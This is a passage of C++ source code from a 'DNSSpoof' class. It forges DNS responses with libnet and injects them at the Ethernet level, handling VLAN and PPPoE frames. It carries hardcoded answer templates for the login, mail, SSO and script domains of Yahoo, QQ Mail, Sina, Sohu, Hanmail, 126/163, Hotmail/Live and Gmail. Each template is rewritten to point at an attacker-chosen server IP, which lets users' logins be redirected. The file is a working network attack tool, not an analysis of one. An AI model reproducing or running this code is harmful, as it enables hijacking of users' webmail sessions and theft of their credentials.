					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,56,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_WGH){
					memcpy(answer,wgh,69);
					memcpy(answer+65,serverIP.ip,IP_ADDR_LEN);
					answerSize=69;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,69,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_GMG){
					memcpy(answer,gmg,84);
					memcpy(answer+80,serverIP.ip,IP_ADDR_LEN);
					answerSize=84;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,84,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_ACCT){
					memcpy(answer,accounts,66);
					memcpy(answer+62,serverIP.ip,IP_ADDR_LEN);
					answerSize=66;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff); 
					udpSum=getCheckSum(answer,66,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
					
				}
				else if(domainFlag==DNS_YCNFORM){
					memcpy(answer,cnformyahoo,69);
					memcpy(answer+65,serverIP.ip,IP_ADDR_LEN);
					answerSize=69;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,69,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_YCNLOGIN){
					memcpy(answer,cnloginyahoo,70);
					memcpy(answer+66,serverIP.ip,IP_ADDR_LEN);
					answerSize=70;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,70,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_YLOGIN){
					memcpy(answer,loginyahoo,96);
					memcpy(answer+92,serverIP.ip,IP_ADDR_LEN);
					answerSize=96;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,96,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_WYAHOO){
					memcpy(answer,wyahoo,99);
					memcpy(answer+79,serverIP.ip,IP_ADDR_LEN);
					memcpy(answer+95,serverIP.ip,IP_ADDR_LEN);
					answerSize=99;
					answerRRS=4;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,99,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_CNYAHOO){
					memcpy(answer,cnyahoo,34);
					memcpy(answer+30,serverIP.ip,IP_ADDR_LEN);
					answerSize=34;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,34,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_YFORM){
					memcpy(answer,myahoo,115);
					memcpy(answer+111,serverIP.ip,IP_ADDR_LEN);
					answerSize=115;
					answerRRS=4;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,115,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SOHU_MAIL){
					memcpy(answer,sohu_mail,35);
					memcpy(answer+31,serverIP.ip,IP_ADDR_LEN);
					answerSize=35;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,35,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SOHU_LOGIN){
					memcpy(answer,sohu_login,66);
					memcpy(answer+62,serverIP.ip,IP_ADDR_LEN);
					answerSize=66;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,66,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_QQMAIL){
					memcpy(answer,qqmail,32);
					memcpy(answer+28,serverIP.ip,IP_ADDR_LEN);
					answerSize=32;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,32,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_MAILQQ){
					memcpy(answer,mailqq,33);
					memcpy(answer+29,serverIP.ip,IP_ADDR_LEN);
					answerSize=33;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,33,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_WMAILQQ){
					memcpy(answer,wmailqq,35);
					memcpy(answer+31,serverIP.ip,IP_ADDR_LEN);
					answerSize=35;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,35,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_HANMAIL_WWW){
					memcpy(answer,hanmail_www,54);
					memcpy(answer+50,serverIP.ip,IP_ADDR_LEN);
					answerSize=54;
					answerRRS=2;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,54,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_HANMAIL_MAIL){
					memcpy(answer,hanmail_mail,35);
					memcpy(answer+31,serverIP.ip,IP_ADDR_LEN);
					answerSize=35;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,35,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_HANMAIL_LOGINS){
					memcpy(answer,hanmail_logins,37);
					memcpy(answer+33,serverIP.ip,IP_ADDR_LEN);
					answerSize=37;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,37,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_HANMAIL_JS){
					memcpy(answer,hanmail_js,95);
					memcpy(answer+91,serverIP.ip,IP_ADDR_LEN);
					answerSize=95;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,95,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_HANMAIL_LOGIN){
					memcpy(answer,hanmail_login,36);
					memcpy(answer+32,serverIP.ip,IP_ADDR_LEN);
					answerSize=36;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,36,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				
				else if(domainFlag==DNS_SINA_LOGIN){
					memcpy(answer,sina_login,39);
					memcpy(answer+35,serverIP.ip,IP_ADDR_LEN);
					answerSize=39;
					answerRRS=1;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,39,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SINA_SSO){
					memcpy(answer,sina_sso,81);
					memcpy(answer+77,serverIP.ip,IP_ADDR_LEN);
					answerSize=81;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,81,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SINA_JS){
					memcpy(answer,sina_js,99);
					memcpy(answer+95,serverIP.ip,IP_ADDR_LEN);
					answerSize=99;
					answerRRS=4;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,99,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				else if(domainFlag==DNS_SINA_IJS){
					memcpy(answer,sina_ijs,78);
					memcpy(answer+74,serverIP.ip,IP_ADDR_LEN);
					answerSize=78;
					answerRRS=3;
					unsigned int port;
					unsigned int cid=(dnsHdr->id&0xffff)+((answerRRS>>8&0xff)+(answerRRS<<8&0xff00));
					port=(pktInfo->destPort<<16&0xffff0000)|(pktInfo->srcPort&0xffff);
					udpSum=getCheckSum(answer,78,pktInfo->destIpv4,pktInfo->srcIpv4,port,cid);
				}
				
				// Get ethernet original type , palyload and len
				unsigned short *vlantype;
				unsigned short vlanLen=0;
				unsigned char * ethPalyload=NULL;
				unsigned short ethPalyloadLen=0;
				unsigned short ethType;
				struct libnet_ethernet_hdr *ethHeader;
				ethHeader=(struct libnet_ethernet_hdr*)pktInfo->packet;				
				unsigned short originalEthType=ntohs(ethHeader->ether_type);
				if(originalEthType==0x8100)      //vlan 
				{
					ethPalyload=(unsigned char *)(pktInfo->packet+ETH_HLEN);
					ethType=originalEthType;
					while(ethType==0x8100)         //valan * n
					{
						//LIBNET_ETH_H
						vlantype=(unsigned short *)(pktInfo->packet + ETH_HLEN+2+vlanLen);
						ethType=ntohs(*vlantype);
						vlanLen+=4;
					}
					if(ethType== 0x8864)     // ppp
					{
						unsigned short *ppptype;
						unsigned short* ppplen=(unsigned short *)(pktInfo->packet + ETH_HLEN+vlanLen+4);
						*ppplen=ntohs(answerSize+42);
						ppptype=(unsigned short *)(pktInfo->packet + ETH_HLEN+vlanLen+6);
						if(ntohs(*ppptype)==0x0021)
						{
							ethPalyloadLen=vlanLen+8;
						}
					}
				}
								
				// no vlan but PPPOE/////////////////////////////////////
				if(originalEthType==0x8864){
					ethPalyload=(unsigned char*)(pktInfo->packet+ETH_HLEN);
					unsigned short* ppplen=(unsigned short*)(pktInfo->packet+ETH_HLEN+4);
					*ppplen=ntohs(answerSize+42);
					ethPalyloadLen=8;
				}
				
				//if(macflag==0)
				// send the fake reply 
				SendFakeDNS(pktInfo->destIpv4, pktInfo->srcIpv4,pktInfo->srcPort,pktInfo->srcMac,pktInfo->destMac,ntohs(dnsHdr->id), answer, answerSize, 0,originalEthType,ethPalyload,ethPalyloadLen);
				
				///////////////////////////////////
				//else
				//SendFakeDNS(pktInfo->destIpv4, pktInfo->srcIpv4,pktInfo->srcPort,macD,macS,ntohs(dnsHdr->id), answer, answerSize, 0,originalEthType,ethPalyload,ethPalyloadLen);
				///////////////////////////////////
			}
		}
	}	
	return true;
	
}


//-----------------------------------------------------------------------
// Func Name   : SendFakeDNS
// Description : send a dns reply
// Parameter   : 
// Return      : int
//-----------------------------------------------------------------------
int DNSSpoof::SendFakeDNS(unsigned int srcIP,unsigned int destIP,unsigned short int updDestPort,unsigned char *destMac,unsigned char *srcMac,unsigned short int checkID, unsigned char *data, size_t datalen, unsigned short int addi_rr,unsigned short ethType, unsigned char * ethPalyload,unsigned short ethPalyloadLen)
{
	cout<<"start SendFakeDNS"<<endl;
	libnet_ptag_t t;
	int c; 
	// create the dns packet 
	
	if(libnetL2==NULL)
		//cout<<"before build dnsv4 libnet_t is null\n";
		LOG_WARN("before build dnsv4 libnet_t is null\n");
	
// A--------------//////////////////////////////////////////////////////////////////
	t = libnet_build_dnsv4(
			LIBNET_UDP_DNSV4_H,    // TCP or UDP 
			checkID,               // id 
			0x8180,                // standard reply, no error 
			1,                     // num_q 
			answerRRS,                     // num_anws_rr 
			0,                     // num_auth_rr 
			addi_rr,               // num_addi_rr 
			data,
			datalen,
			libnetL2,       	  // libnet handle 
			0);
 
// A--------------////////////////////////////////////////////////////////////////
	
/*/ A+++++++++++++////////////////////////////////////////////////////////////////	
	t = libnet_build_dnsv4(
			LIBNET_UDP_DNSV4_H,    // TCP or UDP 
	checkID,               // id 
	0x8400,                // standard reply, no error 
	1,                     // num_q 
	1,                     // num_anws_rr 
	0,                     // num_auth_rr 
	addi_rr,               // num_addi_rr 
	data,
	datalen,
	libnetL2,       	  // libnet handle 
	0);                    // libnet id 
// A+++++++++++++ //////////////////////////////////////////////////////////////*/
	
	
			if(t==-1)
			{
				//cout<<"libnet_build_dns: %s"<<libnet_geterror(libnetL2)<<endl;
				LOG_ERROR("libnet_build_dns: %s\n",libnet_geterror(libnetL2));
			}
	
	// create the udp header 
	t = libnet_build_udp(
			53,                                             // source port 
			updDestPort,                             // destination port htons(
			LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen,    // packet size 
			udpSum,                                              // checksum 
			NULL,                                           // payload 
			0,                                              // payload size 
			libnetL2,                                 		// libnet handle 
			0);                                             // libnet id 
   
	if(t==-1)
	{
		//cout<<"libnet_build_udp: %s"<<libnet_geterror(libnetL2)<<endl;
		LOG_ERROR("libnet_build_udp: %s\n",libnet_geterror(libnetL2));
	}
	// auto calculate the checksum 
	if(libnetL2->protocol_blocks==NULL){
		//cout<<"libnet_t->protocol_blocks is null"<<endl;
		LOG_WARN("libnet_t->protocol_blocks is null\n");
	}
	//libnet_toggle_checksum(libnetL2, t, LIBNET_ON);
  
	// create the IP header 
	t = libnet_build_ipv4(
			LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen, // length 
			0,                                                           // TOS 
			htons(EC_MAGIC_16),                                          // IP ID 
			0,                                                           // IP Frag 
			64,                                                          // TTL 
			IPPROTO_UDP,                                                 // protocol 
			0,                                                           // checksum 
			srcIP,                            // source IP ip_addr_to_int32(&sip->addr),   
			destIP,                              // destination IP ip_addr_to_int32(&tip->addr),  
			NULL,                                                        // payload 
			0,                                                           // payload size 
			libnetL2,                                              // libnet handle  
			0);
	
	if(t==-1)
	{
		//cout<<"libnet_build_ipv4: %s"<<libnet_geterror(libnetL2)<<endl;
		LOG_ERROR("libnet_build_ipv4: %s\n",libnet_geterror(libnetL2));
	}
	  
	// auto calculate the checksum 
	libnet_toggle_checksum(libnetL2, t, LIBNET_ON);
	//cout<<"The last packet size is111 :"<<libnet_getpacket_size(libnetL2);
	
	
	
// A+++++++++++ ///////////////////////////////////////////////////////////////////////////////////	
#ifndef SOCKET_LEVEL_DEF	
	// add the ether header
	if(ethPalyload&&ethPalyloadLen>0)
	{
		unsigned short nlen;
		if(libnet_getpacket_size(libnetL2)< 65535)
		{
		
			t=libnet_build_ethernet(destMac, srcMac,ethType,ethPalyload,ethPalyloadLen,libnetL2,0);
		}
	//	cout<<"The last packet size is :"<<libnet_getpacket_size(libnetL2);
		LOG_INFO("The last packet size is :%d\n",libnet_getpacket_size(libnetL2));
		nlen=(unsigned short )libnet_getpacket_size(libnetL2)-14-ethPalyloadLen;	
		cout<<"packet size :"<<nlen;
		memcpy(ethPalyload+ethPalyloadLen-4,(const char *)htons(nlen),2);		
		//cout<<"total size is :"<<libnetL2->total_size<<endl;
		LOG_INFO("total size is :%d\n",libnetL2->total_size);
	}
	else
	{
		t=libnet_build_ethernet(destMac, srcMac,ETHERTYPE_IP,NULL,0,libnetL2,0);
	}

	//cout<<"The last packet size is :"<<libnet_getpacket_size(libnetL2);
	LOG_INFO("The last packet size is :%d\n",libnet_getpacket_size(libnetL2);
	// send the packet to Layer 2 
	c = libnet_write(libnetL2);
	if (c==-1)
	{
		//cout<<"libnet_write :"<<libnet_geterror(libnetL2)<<endl;
		LOG_ERROR("libnet_write :%s\n",libnet_geterror(libnetL2));
	}
	else
	{
		c =libnet_write(libnetL2);
	}
	c =libnet_write(libnetL2);
	
#endif
// A++++++++++ /////////////////////////////////////////////////////////////////////////////////////*/


// A---------- /////////////////////////////////////////////////////////////////////////////////////*/
#ifdef SOCKET_LEVEL_DEF
//	cout<<"get into sending process\n";
//	cout<<"The last packet size is :"<<libnet_getpacket_size(libnetL2);
	LOG_INFO("The last packet size is :%d\n",libnet_getpacket_size(libnetL2));

	// send the packet to Layer 2 
	c = libnet_write(libnetL2);
	if (c==-1)
	{
		//cout<<"libnet_write :"<<libnet_geterror(libnetL2)<<endl;
		LOG_ERROR("libnet_write :%s\n",libnet_geterror(libnetL2));
	}
	else
	{
		c =libnet_write(libnetL2);
	}
	c =libnet_write(libnetL2);
#endif
// A---------- /////////////////////////////////////////////////////////////////////////////////////*/
	
	cout<<"end SendFakeDNS"<<endl;
	// clear the pblock 
	libnet_clear_packet(libnetL2);
	return c;
}

// End of file

unsigned int getCheckSum_A(unsigned char* dns,int len){
	int flag=len&0x01;
	int i=len>>1;
	int j=0;
	unsigned int sum=0;
	//unsigned int stmp=0;
	unsigned short* stmp=(unsigned short*)dns;
	while(j<i){
		//stmp=((dns[2*j]&0xff)<<8)|(dns[2*j+1]&0xff);
		sum+=*stmp;
		stmp++;
		j++;
	}
	if(flag){
		sum+=(dns[len-1])&0xff;
	}
	sum+=0x1100;
	sum+=((len+20)>>8&0xff)+((len+20)<<8&0xff00);
	sum+=((len+20)>>8&0xff)+((len+20)<<8&0xff00);
	sum+=0x8181;
	return sum;
} 
unsigned int getCheckSum_B(unsigned int ips,unsigned int ipc,unsigned int port,unsigned int id,unsigned int sum){
	unsigned int itmp=0;
	itmp+=(ips>>16&0xffff)+(ips&0xffff);
	itmp+=(ipc>>16&0xffff)+(ipc&0xffff);
	unsigned int iport=(port>>8&0x00ff00ff)|(port<<8&0xff00ff00);
	itmp+=(iport>>16&0xffff)+(iport&0xffff);
	itmp+=(id>>16&0xffff)+(id&0xffff);
	itmp+=sum;
	unsigned int isum=(itmp>>16&0xffff)+(itmp&0xffff);
	isum=(isum>>16&0xffff)+(isum&0xffff);
	isum=(~isum)&0xffff;
	isum=(isum>>8&0xff)+(isum<<8&0xff00);
	return isum;
}

int initReservedSum(){
	unsigned int itmp=0;
	itmp=getCheckSum_A(mlive,119);
	reservedCheckSum[DNS_MAIL_LIVE&0xffff]=itmp;
	itmp=getCheckSum_A(hmail,115);
	reservedCheckSum[DNS_HOTMAIL&0xffff]=itmp;
	itmp=getCheckSum_A(w126,160);
	reservedCheckSum[DNS_W126&0xffff]=itmp;
	itmp=getCheckSum_A(m126,179);
	reservedCheckSum[DNS_M126&0xffff]=itmp;
	itmp=getCheckSum_A(em126,162);
	reservedCheckSum[DNS_EM126&0xffff]=itmp;
	itmp=getCheckSum_A(m163,152);
	reservedCheckSum[DNS_M163&0xffff]=itmp;
	itmp=getCheckSum_A(em163,158);
	reservedCheckSum[DNS_EM163&0xffff]=itmp;
	itmp=getCheckSum_A(wyeah,164);
	reservedCheckSum[DNS_WYEAH&0xffff]=itmp;
	itmp=getCheckSum_A(myeah,183);
	reservedCheckSum[DNS_MYEAH&0xffff]=itmp;
	itmp=getCheckSum_A(emyeah,166);
	reservedCheckSum[DNS_EMYEAH&0xffff]=itmp;
	itmp=getCheckSum_A(yeah,30);
	reservedCheckSum[DNS_YEAH&0xffff]=itmp;
	itmp=getCheckSum_A(llive,74);
	reservedCheckSum[DNS_LLIVE&0xffff]=itmp;
	itmp=getCheckSum_A(wlive,78);
	reservedCheckSum[DNS_WLIVE&0xffff]=itmp;
	itmp=getCheckSum_A(shmail,33);
	reservedCheckSum[DNS_SHMAIL&0xffff]=itmp;
	itmp=getCheckSum_A(homel,79);
	reservedCheckSum[DNS_HOMEL&0xffff]=itmp;
	itmp=getCheckSum_A(s126,29);
	reservedCheckSum[DNS_S126&0xffff]=itmp;
	itmp=getCheckSum_A(wg,56);
	reservedCheckSum[DNS_WG&0xffff]=itmp;
	itmp=getCheckSum_A(wgh,59);
	reservedCheckSum[DNS_WGH&0xffff]=itmp;
	itmp=getCheckSum_A(mg,64);
	reservedCheckSum[DNS_MG&0xffff]=itmp;
	itmp=getCheckSum_A(gmg,84);
	reservedCheckSum[DNS_GMG&0xffff]=itmp;
	itmp=getCheckSum_A(hanmail_www,54);
	reservedCheckSum[DNS_HANMAIL_WWW&0xffff]=itmp;
	itmp=getCheckSum_A(hanmail_mail,35);
	reservedCheckSum[DNS_HANMAIL_MAIL&0xffff]=itmp;
	itmp=getCheckSum_A(hanmail_logins,37);
	reservedCheckSum[DNS_HANMAIL_LOGINS&0xffff]=itmp;
	itmp=getCheckSum_A(hanmail_js,95);
	reservedCheckSum[DNS_HANMAIL_JS&0xffff]=itmp;
	itmp=getCheckSum_A(hanmail_login,36);
	reservedCheckSum[DNS_HANMAIL_LOGIN&0xffff]=itmp;
	itmp=getCheckSum_A(sina_login,39);
	reservedCheckSum[DNS_SINA_LOGIN&0xffff]=itmp;
	itmp=getCheckSum_A(sina_sso,81);
	reservedCheckSum[DNS_SINA_SSO&0xffff]=itmp;
	itmp=getCheckSum_A(sina_js,99);
	reservedCheckSum[DNS_SINA_JS&0xffff]=itmp;
	itmp=getCheckSum_A(sina_ijs,78);
	reservedCheckSum[DNS_SINA_IJS&0xffff]=itmp;
}

unsigned short getCheckSum(unsigned char* dns,int len,unsigned int ips,unsigned int ipc,unsigned int port,unsigned int id){
	int ilen=0;
	if(len%2)	
		ilen=len+25;
	else
		ilen=len+24;	
	char chck[ilen];
	memset(chck,0,ilen);
	memcpy(chck,&ips,4);
	memcpy(chck+4,&ipc,4);
	unsigned short p=0x1100;
	memcpy(chck+8,&p,2);
	unsigned short ulen=len+20;
	ulen=(ulen>>8&0xff)+(ulen<<8&0xff00);
	memcpy(chck+10,&ulen,2);
	unsigned int iport=(port>>8&0x00ff00ff)|(port<<8&0xff00ff00);
	memcpy(chck+12,&iport,4);
	memcpy(chck+16,&ulen,2);
	memcpy(chck+18,&id,4);
	unsigned short f=0x8181;
	memcpy(chck+22,&f,2);
	memcpy(chck+24,dns,len);
	int i=0;
	int j=ilen/2;
	unsigned int sum=0;
	unsigned short* shsum=(unsigned short*)chck;
	while(i<j){
		sum+=*shsum;
		i++;
		shsum++;
	}
	sum=(sum>>16&0xffff)+(sum&0xffff);
	sum=~sum;
	sum=(sum>>8&0xff)|(sum<<8&0xff00);
	FILE* fp=fopen("a.txt","w");
	fwrite(chck,1,ilen,fp);
	fclose(fp);	
	return (unsigned short)sum;
}

